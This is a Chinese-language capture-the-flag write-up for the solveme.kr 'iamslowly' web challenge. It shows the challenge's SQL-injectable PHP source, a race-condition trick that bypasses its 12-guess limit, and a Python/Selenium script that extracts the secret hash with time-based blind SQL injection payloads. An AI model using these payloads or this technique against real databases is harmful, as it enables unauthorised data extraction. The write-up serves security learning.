---
title: solveme.kr-iamsowly
date: 2017-11-14 09:34:11
tags: [web,sql,audit,记录]
categories:

---

## 0x00.一波

题目链接 http://iamslowly.thinkout.rf.gd

这是solveme.kr中最后一道题目,是一道web方面的题（本文没有图片，全是文字！）

```php
 <?php
    // It's 'I am slowly' problem of 'Solve Me'.
    error_reporting(0);
    require __DIR__.'/lib.php'; 

    $table = 'iamslowly_'.ip2long($_SERVER['REMOTE_ADDR']);
    $answer = $_GET['answer'];

    if(isset($answer)){
        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)
            or die('SQL server down');

        $result = mysqli_fetch_array(
            mysqli_query($con, "SELECT `count` FROM `{$table}`;")
        );
        if(!isset($result)){
            mysqli_query($con, "CREATE TABLE IF NOT EXISTS `{$table}` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);");
            $new_answer = md5(sha1('iamslowly_'.mt_rand().'_'.mt_rand().'_'.mt_rand()));
            mysqli_query($con, "INSERT INTO `{$table}` (`answer`,`count`) VALUES ('{$new_answer}',1);");

        }elseif($result['count'] === '12'){
            mysqli_query($con, "DROP TABLE `{$table}`;");
            echo 'Game over';
            goto quit;
        }
```

<!-- more -->

```php
       $randtime = mt_rand(1, 10);
        $result = mysqli_fetch_array(
            mysqli_query($con, "SELECT * FROM `{$table}` WHERE sleep({$randtime}) OR `answer`='{$answer}';")
        );
        if(isset($result) && $result['answer'] === $answer){
            mysqli_query($con, "DROP TABLE `{$table}`;");
            echo $flag;
        }else{
            mysqli_query($con, "UPDATE `{$table}` SET `count`=`count`+1;");
            echo 'Go fast';
        }

quit:
        mysqli_close($con);
        echo '<hr>';
    }

    highlight_file(__FILE__); 
```

代码逻辑很清楚，首先根据访问者的IP来创建一个表，然后在这个表的answer字段插入一个夹含着随机数并且进行两次哈希的摘要，并且表中有一个count字段，再然后需要我们去猜这个answer字段中的摘要，每错一次count值加1，当count等于12，这个表删除，下次访问将会重新建立起表并且设置新的answer。

## 0x01.三折

### 1.update

因为answer我们完全可控，所以是否可以再下列语句中，构造合适的answer来更新或者更改表中的answer，这样下次就一定可以猜到了,然而翻遍了mysql语句大全并没有这类的语法。

```mysql
 "SELECT * FROM `{$table}` WHERE sleep({$randtime}) OR `answer`='{$answer}';"
```

### 2.mt_rand

这个伪随机有什么地方可以突破呢，然而并没有，每次猜错了，下次访问时，php重新运行，种子重置。

### 3.DNS解析

抱歉，试了，没有用。(也许可能跟平台有关系)

## 0x02.从前从前

重新回到代码，看看有什么可以突破的地方。聚焦在count===12，当count等于12时，才删掉表，如果我们可以绕过这个12，是不是就可以猜很多次，然后用时间盲注来获取我们想要的东西呢！那么如何突破这个12成为关键。

<span style="color: #339966;">回到代码逻辑，猜一个answser，先判断count是否为12，然后在判断answer是否对，不对，count加1，如果当count等于11，我们去猜一个answer，然后在它进行判断answer是否对的时候，再进行一个访问猜一个answer，这样两次访问过后count会变成13，从而绕过count===12,接下来可以随便猜！等于说count=11,执行一条sleep很久的语句，同时过一会执行一条sleep很短的语句，后者执行完count加1，然后前者睡完后，count加1，这时候count等于13了，就是如此！（mysql sleep时间累加的，返回值为0）</span>

## 0x03.故事的最后

附上脚本 没有用到的可以删掉哈...

```python
# -*- coding: utf8 -*-
import urllib
import urllib2
import requests
import time
from selenium import webdriver
import sys
string = "1234567890abcdef"
ul="http://iamslowly.thinkout.rf.gd/index.php?answer="
reload(sys)
sys.setdefaultencoding("utf-8")
path="C:\\Program Files (x86)\\Google\\Chrome\\chromedriver_win32\\chromedriver.exe"
driver = webdriver.Chrome(path)
#ul="http://127.0.0.1/test1.php?answer=1"
def doinject(payload):
    url=ul+payload
    print url
    start_time=time.time()
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
    info = { 'User-Agent' : user_agent,
             'Host' : 'iamslowly.thinkout.rf.gd',
             'Cookies' : '__test=dad1d895748e3a49d9d9e72c4c160171'
             }
    start_time=time.time()
    driver.get(url)
    #the_page=driver.page_source.encode('utf-8')
    #the_page = response.read()
    times = time.time() - start_time
    print  times
    if times > 30:
        return True
    else:
        return False
def doinject1(payload):
    url=ul+payload
    print url
    user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
    info = { 'User-Agent' : user_agent,
             'Host':'iamslowly.thinkout.rf.gd',
             'Cookies':'__test=dad1d895748e3a49d9d9e72c4c160171'
             }
    driver.get(url)
    the_page=driver.page_source.encode('utf-8')
    print the_page.find("Game")
    if (the_page.find("Game over")>1):
        return False
    else:
        return True
def getdump5(a):
	pw=''
	for i in range(1,a):
		for j in string:
			data = "' or 1=1 and @ans:=answer union select sleep(case when @ans like '{}{}%' then 30 else 0 END),2-- -".format(pw,j)
			#data = requests.utils.quote(data)
			if doinject(str(data)):
				pw = pw + str(j)
				print "[!] found",pw
				break
				break
	print "[*]The answer is %s" % pw
	print '[*] ok ! get it!'
def  test():
	for x in range(20):
		x=str(x)+"'-- -"
		if doinject1(str(x)):
			pass
		else:
			print "no"
			break
	print 'gg' 
if __name__=='__main__':
		a=32
		getdump5(a)
		#test()
```

（一般来说二分法快一些,只不过时间盲注不适合二分，至少这里是，为了准确性成功一次要等很长时间）

这个网站有一个aes.js保护，并且上诉那个办法奇怪的是 两次不同时间的sleep同时睡完 ，本地没有成功，原网站倒是可以使count大于13（这里有点问题，目前没明白）。最后靠自动化让浏览器去实现了，由于几次都跑错了，所以特意在成功的时候sleep久一点，😔😔..................时间长度额....希望有人改进一下,或者说有其他方法也不一定...

![img](http://myndtt.github.io/images/35.png)

最后感谢李师兄和龙师兄的帮助^_^